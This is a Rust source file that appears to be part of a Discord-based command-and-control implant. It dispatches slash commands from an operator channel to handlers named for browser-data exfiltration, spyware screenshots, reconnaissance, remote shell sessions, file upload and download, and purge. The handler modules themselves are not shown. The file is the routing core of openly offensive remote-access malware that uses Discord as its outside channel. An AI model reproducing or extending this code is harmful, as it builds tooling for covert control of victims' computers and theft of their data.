use serenity::{
	async_trait,
	client::{Context, EventHandler},
	model::{
		application::interaction::{
			application_command::ApplicationCommandInteraction,
			Interaction,
			InteractionResponseType,
		},
		channel::Message,
		gateway::Ready,
	},
};
use tracing::{error, info as informational};

use crate::{
	commands::{
		exfiltration::exfiltrate::handle_exfiltrate,
		misc::{info, purge::purge_handler},
		reconnaissance::recon::recon_handler,
		shell::{
			download::download_handler,
			exit,
			session::{command_handler, session_handler},
			upload::upload_handler,
		},
		spyware::snapshot::snapshot_handler,
	},
	errors::DiscordC2Error,
	register_commands,
	send_agent_check_in,
	utils::agent::get_or_create_agent,
};

pub struct MainHandler;

#[async_trait]
impl EventHandler for MainHandler {
	// This really only handles session messages
	async fn message(&self, ctx: Context, msg: Message) {
		let agent = get_or_create_agent(&ctx).await;
		if let Some(channel) = agent.get_session_channel() {
			if msg.channel_id == *channel {
				if !msg.author.bot {
					let channel = msg
						.channel_id
						.to_channel(&ctx.http)
						.await
						.map_err(DiscordC2Error::from)
						.unwrap();
					informational!(
						"Recieved message: {} in channel: {}",
						msg.content,
						channel.guild().unwrap().name
					);
				}

				command_handler(&ctx, &msg)
					.await
					.expect("Failed to handle command");
			}
		}
	}

	async fn ready(&self, ctx: Context, ready: Ready) {
		informational!("{} is connected!", ready.user.name);
		let ctx_clone = ctx.clone();

		tokio::spawn(async move {
			register_commands(&ctx_clone)
				.await
				.unwrap_or_else(|e| error!("Failed to register commands: {:?}", e));
		});

		send_agent_check_in(&ctx)
			.await
			.unwrap_or_else(|e| error!("Error sending message: {:?}", e));
	}

	async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
		if let Interaction::ApplicationCommand(command) = interaction {
			handle_command_interaction(&ctx, command).await;
		}
	}
}

async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandInteraction) {
	let agent = get_or_create_agent(ctx).await;

	if command.channel_id == *agent.get_command_channel() {
		let content = match command.data.name.as_str() {
			"info" => info::run(&command.channel_id, agent),
			"purge" => {
				if let Err(why) = purge_handler(ctx, &command).await {
					error!("Error handling purge: {:?}", why);
					handle_error(ctx, &command, why.to_string()).await;
				}
				return;
			},
			"exfiltrate-browser" => {
				if let Err(why) = handle_exfiltrate(ctx, &command).await {
					error!("Error handling exfiltrate-browser: {:?}", why);
					handle_error(ctx, &command, why.to_string()).await;
				}
				return;
			},
			"session" => {
				if let Err(why) = session_handler(ctx, &command).await {
					error!("Error handling session: {:?}", why);
					handle_error(ctx, &command, why.to_string()).await;
				}
				return;
			},
			"snapshot" => {
				if let Err(why) = snapshot_handler(ctx, &command).await {
					error!("Error handling snapshot: {:?}", why);
					handle_error(ctx, &command, why.to_string()).await;
				}
				return;
			},
			"recon" => {
				if let Err(why) = recon_handler(ctx, &command).await {
					error!("Error handling recon: {:?}", why);
					handle_error(ctx, &command, why.to_string()).await
				}
				return;
			},
			_ => "The command has not been implemented within the commands channel.".to_string(),
		};

		handle_error(ctx, &command, content).await;
	} else if command.channel_id == agent.get_session_channel().unwrap() {
		let content = match command.data.name.as_str() {
			"exit" => {
				exit::run(ctx).await.expect("TODO: panic message"); // TODO: handle error
				return;
			},
			"download-file" => {
				if let Err(why) = download_handler(ctx, &command).await {
					handle_error(ctx, &command, why.to_string()).await;
				}
				return;
			},
			"upload-file" => {
				if let Err(why) = upload_handler(ctx, &command).await {
					handle_error(ctx, &command, why.to_string()).await
				}
				return;
			},
			_ => "That command is not supported for command sessions.".to_string(),
		};
		handle_error(ctx, &command, content).await;
	}
}

async fn handle_error(ctx: &Context, command: &ApplicationCommandInteraction, content: String) {
	if let Err(why) = command
		.create_interaction_response(&ctx.http, |response| {
			response
				.kind(InteractionResponseType::ChannelMessageWithSource)
				.interaction_response_data(|message| message.content(&content))
		})
		.await
	{
		error!("Cannot respond to slash command: {}", why);
	}
}
